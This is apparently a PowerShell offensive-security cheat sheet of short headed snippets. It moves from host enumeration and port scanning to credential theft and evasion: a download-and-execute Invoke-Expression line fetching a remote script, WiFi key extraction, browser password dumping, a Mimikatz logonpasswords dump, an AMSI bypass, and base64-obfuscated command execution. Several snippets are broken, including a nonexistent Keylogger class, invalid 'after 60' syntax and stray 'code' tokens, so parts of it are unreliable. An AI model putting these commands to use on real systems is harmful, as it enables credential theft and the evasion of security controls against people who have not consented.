## Enumeration: System Information
```
Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
```
## Enumeration: Network Configuration
```
Get-NetIPConfiguration | Select-Object -Property InterfaceAlias, IPv4Address, IPv6Address, DNServer
```
## Enumeration: Running Processes
```
Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending
```
## Enumeration: FailedAudits in Event Logs
```
Get-EventLog -LogName Security | Where-Object {$_.EntryType -eq 'FailureAudit'}
```
## Enumeration: Scanning for open ports
```
1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async =
$sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false);
if($sock.Connected) { $_ } ; $sock.Close() }
```
## Retrieve stored credentials
```
$cred = Get-Credential; $cred.GetNetworkCredential() | Select-Object -Property UserName, Password
```
## Fetch script hosted on URL
```
$url = 'http://example.com/script.ps1'; Invoke-Expression (New-Object
Net.WebClient).DownloadString($url)
```
## Custom keylogger
```
$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object
System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys |
Out-File -FilePath $path
```
## Extract wireless profiles and passwords
```
netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_
-replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear }
```
## Monitor file system changes
```
$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\';
$watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent
$watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }
```
## Extract browser passwords
```
Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\temp\browser_passwords.txt
```
## Custom network sniffer
```
$adapter = Get-NetAdapter | Select-Object -First 1; New-NetEventSession -Name 'Session1' -CaptureMode
SaveToFile -LocalFilePath 'C:\temp\network_capture.etl'; Add-NetEventPacketCaptureProvider -SessionName
'Session1' -Level 4 -CaptureType Both -Enable; Start-NetEventSession -Name 'Session1'; Stop-
NetEventSession -Name 'Session1' after 60
```
## Bypass AMSI on Powershell
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,S
tatic').SetValue($null,$true)
```
## Mimikatz dump via PS
```
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File -FilePath C:\temp\logonpasswords.txt
```
## String Obfuscation
```
$originalString = 'SensitiveCommand'; $obfuscatedString =
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString =code code
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); Invoke-code
Expression $decodedString
```
